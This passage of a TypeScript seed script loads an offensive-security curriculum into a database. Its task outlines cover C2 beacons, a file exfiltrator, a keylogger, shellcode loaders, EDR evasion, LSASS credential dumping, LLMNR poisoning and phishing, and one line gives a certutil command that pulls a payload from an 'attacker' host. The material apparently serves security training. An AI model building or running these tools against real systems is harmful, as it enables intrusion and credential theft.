			['Add HTTP C2 client', 'Beacon: sleep, then HTTP GET to /tasks. Parse JSON response for commands. Execute, collect output. HTTP POST results to /results. Add jitter (±20%) to sleep. Handle connection errors gracefully.', '## C2 Client\n\nPeriodic checkin\nReceive tasks\nReturn results'],
			['Build file exfiltrator', 'Walk directories for interesting extensions (.docx, .xlsx, .pdf, .kdbx). Compress with archive/zip. Base64 encode. Upload via HTTP POST or chunk into DNS queries. Report files found.', '## Exfil\n\nFind interesting files\nCompress and encode\nUpload to C2'],
			['Implement keylogger', 'Windows: user32.dll SetWindowsHookEx for keyboard hook, GetAsyncKeyState for polling. Linux: read /dev/input/eventX (requires root). Log to file with timestamps. Capture passwords, commands.', '## Keylogger\n\nHook keyboard (Windows)\n/dev/input (Linux)\nLog keystrokes'],
			['Add persistence', 'Windows: Registry Run key (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run), scheduled task (schtasks), or service. Linux: cron, systemd service, .bashrc. Survive reboots.', '## Persistence\n\nStartup registration\nScheduled tasks\nService creation'],
		] as [string, string, string][] },
	]},

	// Red Team Tooling: Python (56)
	{ id: 56, modules: [
		{ name: 'Week 1-2: Python Security Basics', desc: 'Python for security', tasks: [
			['Network programming', 'Create sockets: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM). Connect: s.connect((host, port)). Send/recv data. Server: s.bind(), s.listen(), conn = s.accept(). Handle timeouts and errors.', '## Sockets\n\n```python\nimport socket\ns = socket.socket()\ns.connect((host, port))\n```'],
			['HTTP operations', 'Use requests library: r = requests.get(url), r = requests.post(url, data=payload). Sessions for cookies: s = requests.Session(). Proxies: proxies={"http": "http://127.0.0.1:8080"}. Handle redirects, timeouts.', '## HTTP\n\nrequests.get/post\nSession handling\nProxy support'],
			['Process execution', 'Run commands: result = subprocess.run(["cmd", "/c", "dir"], capture_output=True, text=True). Access result.stdout, result.returncode. Shell=True for shell features. Popen for streaming output.', '## Subprocess\n\n```python\nsubprocess.run([\'cmd\'], capture_output=True)\n```'],
			['File operations', 'Pathlib: Path("file.txt").read_text(), path.write_bytes(data). Walk: for f in Path(".").rglob("*.txt"). OS module: os.walk, os.path.exists, os.chmod. Handle permissions and errors gracefully.', '## Files\n\nPath handling\nWalking directories\nReading/writing'],
			['Implement threading', 'ThreadPoolExecutor: with ThreadPoolExecutor(max_workers=10) as e: futures = [e.submit(func, arg) for arg in args]. Queue for task distribution. threading.Lock() for shared state. Avoid race conditions.', '## Threading\n\nThreadPoolExecutor\nQueue for tasks\nThread-safe operations'],
			['Add argument parsing', 'Argparse: parser = argparse.ArgumentParser(description="Tool"). Add args: parser.add_argument("-t", "--target", required=True). Parse: args = parser.parse_args(). Access: args.target.', '## Argparse\n\n```python\nparser = argparse.ArgumentParser()\nparser.add_argument(\'-t\', \'--target\')\n```'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Security Tools', desc: 'Python tools', tasks: [
			['Build web scanner', 'Directory brute force: concurrent requests to /FUZZ with wordlist. Filter by status code (hide 404), content length, response body. Follow 301 redirects. Save interesting results (200, 403, 500).', '## Scanner\n\nConcurrent requests\nFilter responses\nFollow redirects'],
			['Implement password sprayer', 'Test creds across protocols: SMB (smbclient), LDAP (ldap3), HTTP forms. Lockout awareness: 1 password per 30 min across all users. Random delays between attempts. Report successes.', '## Sprayer\n\nMultiple protocols\nLockout awareness\nRandom delays'],
			['Add OSINT tool', 'Subdomain enum: crt.sh API, DNS brute force. Email harvesting: scrape pages, theHarvester-style. Whois lookups. Social media: check username availability across platforms. Correlate findings.', '## OSINT\n\nSubdomain enum\nEmail harvesting\nSocial media lookup'],
			['Build phishing toolkit', 'Clone pages: requests.get + BeautifulSoup, save HTML/assets. Track clicks: unique URLs per target. Capture credentials: simple Flask server logging POST data. Send emails with tracking.', '## Phishing\n\nClone pages\nTrack clicks\nCapture credentials'],
			['Implement log analyzer', 'Parse formats: Apache, nginx, Windows Event logs. Extract IOCs: IPs, URLs, file hashes using regex. Build timeline of events. Search for patterns. Output suspicious entries with context.', '## Logs\n\nParse formats\nExtract IOCs\nTimeline analysis'],
			['Add automation framework', 'Chain tools: output of one feeds input of next. Error handling: retry failed steps, log errors. Reporting: generate HTML/JSON report of findings. Config-driven workflows.', '## Automation\n\nPipeline tools\nError handling\nReporting'],
		] as [string, string, string][] },
	]},

	// Red Team Tooling: Rust (54)
	{ id: 54, modules: [
		{ name: 'Week 1-2: Rust Fundamentals', desc: 'Rust for security', tasks: [
			['Set up Rust environment', 'Install rustup from rustup.rs. Run rustup install stable. Create project: cargo new myproject. VS Code with rust-analyzer extension for IDE features. cargo build, cargo run for compilation.', '## Setup\n\nrustup install\ncargo new project\nRust analyzer'],
			['Learn ownership', 'Each value has one owner. When owner goes out of scope, value is dropped. Borrowing: &x (immutable), &mut x (mutable). Only one mutable borrow at a time. Lifetimes: specify how long references are valid.', '## Ownership\n\nOwnership rules\nBorrowing\nLifetimes'],
			['Implement networking', 'Sync: TcpStream::connect("host:port"), TcpListener::bind(":8080"). Async with tokio: #[tokio::main], TcpStream::connect().await. Spawn tasks: tokio::spawn(async { ... }). Handle timeouts.', '## Networking\n\nTcpListener\nTcpStream\nasync with tokio'],
			['Process execution', 'Run commands: Command::new("cmd").arg("/c").arg("dir").output()?. Check output.status.success(). Read output.stdout as bytes. Set current_dir, environment variables. Spawn for async execution.', '## Command\n\n```rust\nCommand::new(\"cmd\")\n  .arg(\"/c\")\n  .arg(\"dir\")\n  .output()\n```'],
			['Add error handling', 'Result<T, E>: Ok(value) or Err(error). Option<T>: Some(value) or None. The ? operator propagates errors. anyhow crate for easy error handling. thiserror for custom error types.', '## Errors\n\nResult<T, E>\nOption<T>\n? operator'],
			['Build CLI interface', 'Clap crate with derive: #[derive(Parser)] struct Args { #[arg(short, long)] target: String }. Parse: let args = Args::parse(). Generates --help, validates input, supports subcommands.', '## Clap\n\n```rust\n#[derive(Parser)]\nstruct Args {\n  #[arg(short, long)]\n  target: String,\n}\n```'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Security Tools', desc: 'Rust tools', tasks: [
			['Build port scanner', 'Async with tokio: spawn tasks for each port, use semaphore for concurrency limit. tokio::time::timeout for connection timeout. Collect results via channel. Fast due to zero-cost async.', '## Scanner\n\nTokio async\nConcurrent connections\nTimeout handling'],
			['Implement implant', 'Small, fast binary (release + strip = <1MB). Cross-compile: cargo build --target x86_64-pc-windows-gnu. Anti-analysis: string obfuscation, timing checks. Native code harder to reverse than .NET/Go.', '## Implant\n\nSmall binary\nAnti-analysis\nCross-platform'],
			['Add file operations', 'std::fs: read_to_string, write, copy, remove_file. walkdir crate for recursive traversal. Handle permissions: fs::metadata().permissions(). Timestamp manipulation for anti-forensics.', '## Files\n\nstd::fs\nwalkdir crate\nPermission handling'],
			['Build cryptographic tools', 'ring crate for crypto: AES-256-GCM encryption/decryption, PBKDF2 key derivation, secure random. Alternative: RustCrypto crates. Implement key exchange, encrypted communications.', '## Crypto\n\nring or rust-crypto\nAES encryption\nKey derivation'],
			['Implement shellcode loader', 'Windows: VirtualAlloc with PAGE_EXECUTE_READWRITE via windows crate. Linux: mmap with PROT_EXEC. Copy shellcode, cast to function pointer, call. Avoid DEP issues with proper memory protection.', '## Shellcode\n\nVirtualAlloc (Windows)\nmmap (Linux)\nExecute in memory'],
			['Add evasion techniques', 'String encryption: encrypt at compile time, decrypt at runtime. API hashing: hash function names, resolve dynamically. Direct syscalls: avoid ntdll hooks. Rust makes this safer with type system.', '## Evasion\n\nString encryption\nAPI hashing\nSyscalls'],
		] as [string, string, string][] },
	]},

	// Red Team Tooling: C# (53)
	{ id: 53, modules: [
		{ name: 'Week 1-2: C# Fundamentals', desc: 'C# for offense', tasks: [
			['Set up .NET environment', 'Install .NET SDK. Create project: dotnet new console -n MyTool. Build: dotnet build -c Release. Self-contained: dotnet publish -r win-x64 --self-contained. VS Code or Visual Studio for development.', '## Setup\n\ndotnet new console\ndotnet build\nCross-platform'],
			['Learn P/Invoke', 'Call Windows APIs: [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect); Marshal for data conversion. Handle IntPtr, structures, callbacks.', '## P/Invoke\n\n```csharp\n[DllImport(\"kernel32.dll\")]\nstatic extern IntPtr VirtualAlloc(...);\n```'],
			['Implement process operations', 'Start: Process.Start("cmd.exe", "/c dir"). Enumerate: Process.GetProcesses(). Kill: process.Kill(). For injection: OpenProcess, VirtualAllocEx, WriteProcessMemory via P/Invoke.', '## Processes\n\nProcess.Start()\nProcess enumeration\nProcess injection'],
			['Add registry operations', 'Read: Registry.GetValue(@"HKEY_CURRENT_USER\\Software", "Key", null). Write: Registry.SetValue(...). RegistryKey.OpenSubKey for navigation. Used for persistence, config storage, credential extraction.', '## Registry\n\nRegistry.GetValue()\nRegistry.SetValue()\nPersistence'],
			['Build WMI queries', 'Query: new ManagementObjectSearcher("SELECT * FROM Win32_Process"). Remote: ConnectionOptions with credentials, ManagementScope for remote machine. Execute methods for remote code execution.', '## WMI\n\n```csharp\nManagementObjectSearcher\nQuery system info\nRemote execution\n```'],
			['Implement reflection', 'Load assembly: Assembly.Load(bytes) from memory. Get types: assembly.GetTypes(). Invoke: type.GetMethod("Main").Invoke(null, args). Enables execute-assembly without writing to disk.', '## Reflection\n\nAssembly.Load()\nType.GetMethod()\nDynamic invocation'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Offensive Tools', desc: 'C# tools', tasks: [
			['Build process injector', 'Classic injection: OpenProcess → VirtualAllocEx (allocate RWX memory) → WriteProcessMemory (write shellcode) → CreateRemoteThread (execute). Target common processes: explorer.exe, svchost.exe.', '## Injection\n\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread'],
			['Implement credential dumper', 'MiniDumpWriteDump to create LSASS dump. Parse offline with mimikatz or pypykatz. Alternative: use NtReadVirtualMemory to read LSASS memory directly. Extract NTLM hashes, Kerberos tickets.', '## Creds\n\nMiniDumpWriteDump\nParse dump\nExtract hashes'],
			['Add lateral movement', 'WMI: ManagementClass("Win32_Process").InvokeMethod("Create", cmdline). Service: ServiceController with remote machine. PSExec-style: copy binary, create/start service, read output, cleanup.', '## Lateral\n\nWMI execution\nService creation\nPSExec-style'],
			['Build persistence tool', 'Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Task Scheduler: TaskService API. Services: ServiceInstaller. Choose based on privileges: HKCU (user), HKLM/services (admin).', '## Persistence\n\nRegistry run keys\nScheduled tasks\nServices'],
			['Implement AD enumeration', 'LDAP: DirectorySearcher with filter "(objectClass=user)". Get properties: sAMAccountName, memberOf, servicePrincipalName. Find: Domain Admins, Kerberoastable users, computers with delegation.', '## AD Enum\n\nDirectorySearcher\nQuery users, groups\nFind attack paths'],
			['Add execute-assembly', 'Load .NET assembly from bytes: Assembly.Load(assemblyBytes). Find entry point. Invoke with arguments. Output captured via Console redirection. In-memory execution, no file on disk.', '## Execute\n\nLoad .NET assembly\nInvoke entry point\nNo disk write'],
		] as [string, string, string][] },
	]},

	// Reimplement: Nmap (68)
	{ id: 68, modules: [
		{ name: 'Week 1-2: Port Scanning', desc: 'Scan techniques', tasks: [
			['Implement TCP connect scan', 'Full 3-way handshake: SYN → SYN-ACK → ACK. Uses OS socket connect(). Most reliable but logged by target. No special privileges needed. Nmap: -sT flag. Connection established = port open.', '## TCP Connect\n\nComplete 3-way handshake\nReliable detection\nLogged by target'],
			['Build SYN scan', 'Half-open: send SYN only. SYN-ACK = open, RST = closed. Send RST to close (never completes handshake). Requires raw sockets (root). Stealthier, faster. Nmap default: -sS. Most popular scan type.', '## SYN Scan\n\nSend SYN\nRST = closed, SYN-ACK = open\nDon\'t complete handshake'],
			['Add UDP scan', 'Send UDP packet. ICMP port unreachable = closed. No response = open|filtered (can\'t tell without app response). Very slow due to rate limiting. Nmap: -sU. Send protocol-specific probes for better detection.', '## UDP Scan\n\nSend UDP packet\nICMP unreachable = closed\nNo response = open|filtered'],
			['Implement service detection', 'Connect to open ports, send probes (NULL, HTTP GET, SMB negotiate). Match responses against signature database (nmap-service-probes). Identify service and version: "OpenSSH 8.2p1 Ubuntu".', '## Service Detection\n\nConnect to open ports\nSend probes\nMatch signatures'],
			['Build OS detection', 'TCP/IP stack fingerprinting: TTL (64=Linux, 128=Windows), TCP window size, options order, IPID sequence, TCP timestamp. Send crafted packets, analyze responses. Match against OS database.', '## OS Detection\n\nTTL values\nTCP window size\nOption order'],
			['Add timing controls', 'Templates -T0 (paranoid) to -T5 (insane). Control: max parallelism, probe timeout, retry count, scan delay. Balance speed vs detection vs reliability. -T4 common for fast, reliable scans.', '## Timing\n\n-T0 to -T5\nParallelism\nTimeouts'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Advanced Features', desc: 'Full scanner', tasks: [
			['Implement host discovery', 'Find live hosts before port scanning. Methods: ICMP echo, TCP SYN to 443, TCP ACK to 80, ARP for local network (most reliable). Nmap: -sn. Skip discovery for thorough scan: -Pn.', '## Discovery\n\nPing scan\nARP scan (local)\nTCP/UDP probes'],
			['Build script engine', 'Like NSE (Nmap Scripting Engine). Lua or Python scripts for: vuln detection (CVE checks), brute force (ssh-brute), enumeration (smb-enum-shares). Categories: safe, intrusive, vuln, exploit.', '## Scripts\n\nVuln detection\nBrute force\nService enumeration'],
			['Add output formats', 'Normal: human-readable. XML: structured for parsing (-oX). Grepable: one line per host (-oG). JSON: modern APIs. All at once: -oA basename. Include timestamps, scan parameters.', '## Output\n\n- Normal\n- XML\n- Grepable\n- JSON'],
			['Implement evasion', 'IDS bypass techniques: decoy scans (-D for fake source IPs), fragmentation (-f), custom source port (--source-port 53), slow timing (-T0), randomize host order. Avoid detection patterns.', '## Evasion\n\nDecoy scans\nFragmentation\nSource port manipulation'],
			['Build target specification', 'Parse inputs: single IP, CIDR (192.168.1.0/24), ranges (192.168.1-10.1-254), hostnames. Resolve DNS. Exclude targets: --exclude. Input from file: -iL. Handle IPv4 and IPv6.', '## Targets\n\nCIDR notation\nIP ranges\nHostname resolution'],
			['Add IPv6 support', 'Full IPv6 scanning: -6 flag. Handle 128-bit addresses. Link-local scope (fe80::). Neighbor Discovery Protocol for local scanning. IPv6 is less commonly monitored—useful for evasion.', '## IPv6\n\nFull IPv6 support\nScope handling\nNeighbor discovery'],
		] as [string, string, string][] },
	]},

	// Reimplement: Responder (65)
	{ id: 65, modules: [
		{ name: 'Week 1-2: Protocol Poisoning', desc: 'LLMNR/NBT-NS/mDNS', tasks: [
			['Implement LLMNR responder', 'Listen on multicast 224.0.0.252:5355 (UDP). When victim queries for hostname (e.g., "fileserver"), respond with attacker IP. Victim connects to us instead of real server. Windows uses LLMNR when DNS fails.', '## LLMNR\n\nListen on 224.0.0.252:5355\nRespond to name queries\nProvide attacker IP'],
			['Build NBT-NS responder', 'Listen on UDP 137 for NetBIOS name broadcasts. Same attack as LLMNR but older protocol. Respond to name queries with attacker IP. Often enabled alongside LLMNR on Windows networks.', '## NBT-NS\n\nListen on UDP 137\nRespond to broadcasts\nSimilar to LLMNR'],
			['Add mDNS responder', 'Listen on 224.0.0.251:5353 (multicast DNS). Used by Apple devices, Linux, IoT. Respond to .local queries. Poison hostname resolution. Less common in Windows enterprise but useful for mixed environments.', '## mDNS\n\nListen on 224.0.0.251:5353\nApple/Linux name resolution\nPoison queries'],
			['Implement WPAD responder', 'Web Proxy Auto-Discovery: respond to wpad.domain queries with attacker IP. Serve malicious wpad.dat pointing browser proxy to attacker. Intercept HTTP traffic, capture credentials from forms.', '## WPAD\n\nProxy config poisoning\nCapture HTTP traffic\nCredential theft'],
			['Build DHCPv6 server', 'Send DHCPv6 advertisements with attacker as DNS server. Windows prefers IPv6 when available. All DNS queries go to attacker. MITM without ARP spoofing. Very effective on modern networks.', '## DHCPv6\n\nRogue DNS server\nMITM IPv6 traffic'],
			['Add DNS poisoning', 'Run rogue DNS server. Respond to queries with attacker IP for interesting hostnames (intranet, sharepoint, mail). Or respond to all queries. Combine with poisoning to intercept DNS after LLMNR/NBT-NS.', '## DNS\n\nRespond to DNS queries\nPoint to attacker\nCapture traffic'],
		] as [string, string, string][] },
		{ name: 'Week 3-4: Authentication Capture', desc: 'Credential harvesting', tasks: [
			['Implement SMB server', 'Run SMB server on port 445. When victim connects (after LLMNR poisoning), request NTLM authentication. Capture NTLMv2 hash. Log: username, domain, hash. Crack offline with hashcat -m 5600.', '## SMB\n\nFake SMB server\nCapture NTLMv2 hashes\nLog credentials'],
			['Build HTTP server', 'HTTP server requesting NTLM auth (WWW-Authenticate: NTLM). Browsers auto-send credentials to "intranet" sites. Also capture Basic auth (base64 plaintext). Useful with WPAD poisoning.', '## HTTP\n\nRequest NTLM auth\nCapture hashes\nBasic auth capture'],
			['Add FTP server', 'Rogue FTP server on port 21. FTP sends credentials in plaintext: USER username, PASS password. No cracking needed. Useful when scripts or apps try to access FTP shares after poisoning.', '## FTP\n\nRogue FTP server\nCapture plaintext creds'],
			['Implement LDAP server', 'LDAP server on 389. Simple bind = plaintext password in bind request. NTLM bind = capture hash like SMB. Applications connecting to AD after poisoning reveal credentials. Very effective.', '## LDAP\n\nFake LDAP server\nSimple bind = plaintext\nNTLM bind = hash'],
			['Build MSSQL server', 'Fake MSSQL on port 1433. Capture SQL Server authentication or Windows NTLM auth. Applications with connection strings to SQL servers reveal credentials after poisoning hostname.', '## MSSQL\n\nFake SQL server\nCapture credentials\nNTLM hashes'],
			['Add analysis mode', 'Passive mode: listen for broadcasts but don\'t respond. See what names are being queried without active poisoning. Safe reconnaissance. Identify targets before going active. Avoid detection.', '## Analysis\n\nNo poisoning\nJust capture broadcasts\nSafe reconnaissance'],
		] as [string, string, string][] },
	]},

	// Remaining paths with 4-6 tasks - expand with more modules
	// Evasion & Payload Tools (86)
	{ id: 86, modules: [
		{ name: 'Shellcode Development', desc: 'Custom shellcode', tasks: [
			['Write position-independent code', 'No absolute addresses—code runs at any memory location. Use RIP-relative addressing (x64). Calculate addresses at runtime with delta offset. All data relative to instruction pointer. Essential for shellcode.', '## PIC\n\nNo hardcoded addresses\nRelative addressing\nDynamic resolution'],
			['Implement API hashing', 'Avoid string-based API names: hash function names (e.g., ror13). Walk PEB → Ldr → InMemoryOrderModuleList. Find kernel32.dll, parse EAT (Export Address Table). Match hashes to find functions like LoadLibraryA.', '## API Hash\n\nHash function names\nWalk PEB/EAT\nFind by hash'],
			['Build syscall stubs', 'Call Windows kernel directly: avoid ntdll.dll hooks. Get syscall numbers (SSN) from ntdll. Build stub: mov r10,rcx; mov eax,SSN; syscall; ret. SysWhispers/HellsGate automate this. Bypass usermode EDR hooks.', '## Syscalls\n\nAvoid ntdll hooks\nDirect kernel calls\nSyswhispers approach'],
			['Add shellcode encoder', 'Obfuscate shellcode to evade signatures: XOR with key, custom encoding schemes. Prepend decoder stub that reverses encoding at runtime. Example: msfvenom -e x86/shikata_ga_nai. Avoid null bytes.', '## Encoding\n\nXOR encoding\nCustom encoding\nDecoder stub'],
			['Implement shellcode loader', 'Execution methods: VirtualAlloc(RWX) + memcpy + call. Callbacks: EnumDisplayMonitors, CreateTimerQueueTimer with shellcode as callback. Module stomping: overwrite legitimate DLL in memory with shellcode.', '## Loaders\n\nVirtualAlloc + memcpy\nCallback execution\nModule stomping'],
			['Build egg hunter', 'Small stub (~32 bytes) that searches memory for "egg" (unique tag) preceding larger payload. Useful when buffer overflow is small but full shellcode exists elsewhere in memory. Use SEH to handle access violations.', '## Egg Hunter\n\nSmall stub finds larger payload\nUseful for small buffer overflow'],
		] as [string, string, string][] },
		{ name: 'Payload Delivery', desc: 'Delivery mechanisms', tasks: [
			['Build dropper', 'Download payload: URLDownloadToFile, WinHTTP, or PowerShell. Write to disk and execute, or download directly to memory (IEX). Example: certutil -urlcache -split -f http://attacker/payload.exe C:\\payload.exe', '## Dropper\n\nFetch payload\nWrite and execute\nOr execute in memory'],
			['Implement stager', 'Small first stage (<4KB) evades detection, downloads full payload. Example: shellcode that allocates memory, downloads beacon, jumps to it. msfvenom staged payloads: windows/meterpreter/reverse_tcp.', '## Stager\n\nSmall first stage\nDownloads full payload\nMinimal detection surface'],
			['Add Office macros', 'VBA macros in .docm/.xlsm: Auto_Open() or Document_Open(). Download with PowerShell: Shell("powershell -ep bypass -c IEX(...)"). AMSI bypass first. Disable macros warning with .doc (old format).', '## Macros\n\nVBA download\nPowerShell execution\nAMSI bypass'],
			['Build HTA payload', 'HTML Application: <script language="VBScript">. Run via mshta.exe. Not subject to browser restrictions. No Mark-of-the-Web (MOTW) warning if opened directly. Embed VBScript or JScript for execution.', '## HTA\n\nmshta.exe execution\nJScript/VBScript\nNo Mark-of-the-Web'],
			['Implement LNK payload', 'Shortcut files with command line: C:\\Windows\\System32\\cmd.exe /c payload. Spoof icon to look like PDF/folder. Target field executes on double-click. Combine with hidden payload in same directory.', '## LNK\n\nMalicious shortcut\nIcon spoofing\nCommand execution'],
			['Add ISO/IMG delivery', 'ISO files auto-mount on Windows 10+. Contents not marked with MOTW (bypasses SmartScreen). Package LNK + hidden payload in ISO. User mounts, clicks LNK, payload runs without MOTW warning.', '## ISO\n\nBypass Mark-of-the-Web\nAuto-mount on Windows\nHide payload inside'],
		] as [string, string, string][] },
	]},

	// Exploit Development Tools (85)
	{ id: 85, modules: [
		{ name: 'Memory Corruption', desc: 'Buffer overflow basics', tasks: [
			['Understand stack layout', 'Stack grows down. On function call: push arguments, push return address, push saved EBP, allocate locals. Overflow local buffer → overwrite saved EBP → overwrite return address. Control execution on ret.', '## Stack\n\nReturn address\nSaved frame pointer\nLocal variables\nFunction arguments'],
			['Implement fuzzer', 'Generate test inputs: random, mutational (flip bits in valid input), generational (grammar-based). Monitor for crashes: catch SIGSEGV, check for hangs. Triage: unique crashes by call stack. AFL, libFuzzer as reference.', '## Fuzzing\n\nGenerate test cases\nMonitor for crashes\nTriaging crashes'],
			['Build pattern generator', 'Generate unique pattern: msf-pattern_create -l 1000. Crash shows pattern in EIP. Find offset: msf-pattern_offset -q <EIP_value>. Now know exactly which buffer position overwrites return address.', '## Pattern\n\nUnique pattern generation\nFind EIP offset\ncyclic pattern'],
			['Control EIP/RIP', 'Overwrite return address with buffer. jmp esp: jump to shellcode on stack. Or overwrite with ROP gadget address. Use debugger to verify control: EIP = 0x41414141 ("AAAA") from overflow.', '## Control Flow\n\nOverwrite return address\nJump to shellcode\nROP gadgets'],
			['Implement ROP chain', 'DEP prevents execution on stack. Chain gadgets (ret-ending sequences): pop registers, call VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &old). Now stack is executable. Jump to shellcode.', '## ROP\n\nFind gadgets\nChain to disable DEP\nCall VirtualProtect'],
			['Add heap exploitation', 'Heap overflow: corrupt heap metadata (size, prev/next pointers). Use-after-free: object freed, reallocated with attacker data, old pointer dereferenced. Heap spray: fill heap with shellcode, predict address.', '## Heap\n\nHeap metadata corruption\nUse-after-free\nHeap spraying'],
		] as [string, string, string][] },
		{ name: 'Modern Mitigations', desc: 'Bypass protections', tasks: [
			['Bypass ASLR', 'Addresses randomized at load. Bypass: info leak (format string, OOB read) reveals address → calculate base. Partial overwrite (only overwrite low bytes). Non-ASLR modules. Heap spray with known offset.', '## ASLR\n\nInfo leak\nPartial overwrite\nJIT spray'],
			['Bypass DEP/NX', 'Stack/heap not executable. Bypass: ROP chain to VirtualProtect (make memory executable) or VirtualAlloc (allocate executable memory). Linux: mprotect. Return-to-libc: call system("/bin/sh").', '## DEP\n\nROP to VirtualProtect\nROP to mprotect\nReturn-to-libc'],
			['Bypass stack canaries', 'Random value before return address, checked before ret. Bypass: info leak to read canary value. Brute force if fork() (child has same canary). Overwrite exception handler (SEH) instead of return address.', '## Canaries\n\nInfo leak\nBrute force (fork)\nOverwrite handler'],
			['Bypass CFG', 'Control Flow Guard validates indirect call targets. Bypass: use valid CFG targets (still exploitable functions), corrupt CFG bitmap, abuse Microsoft Edge JIT. Or find non-CFG-protected module.', '## CFG\n\nFind allowed targets\nUse valid call sites\nAbuse CFG bitmap'],
			['Implement info leak', 'Leak memory to defeat ASLR: format string (%p%p%p leaks stack), out-of-bounds read (array[-1] reads before buffer), use-after-free (freed object contains pointers), uninitialized variable.', '## Info Leak\n\nFormat string\nOut-of-bounds read\nUse-after-free'],
			['Build exploit framework', 'Reliable exploitation: detect target version/arch, select appropriate payload, handle errors gracefully, verify exploitation success. Clean up after exploitation. Template for similar vulnerabilities.', '## Framework\n\nTarget detection\nPayload selection\nError handling'],
		] as [string, string, string][] },
	]},
];

// Expand all paths
for (const path of needsExpansion) {
	console.log(`Expanding: ${path.id}`);
	expandPath(path.id, path.modules);
}

console.log('Done!');

const finalCount = db.prepare(`
	SELECT COUNT(*) as paths,
	(SELECT COUNT(*) FROM modules) as modules,
	(SELECT COUNT(*) FROM tasks) as tasks
	FROM paths
`).get() as { paths: number; modules: number; tasks: number };

console.log(`Final counts: ${finalCount.paths} paths, ${finalCount.modules} modules, ${finalCount.tasks} tasks`);

db.close();
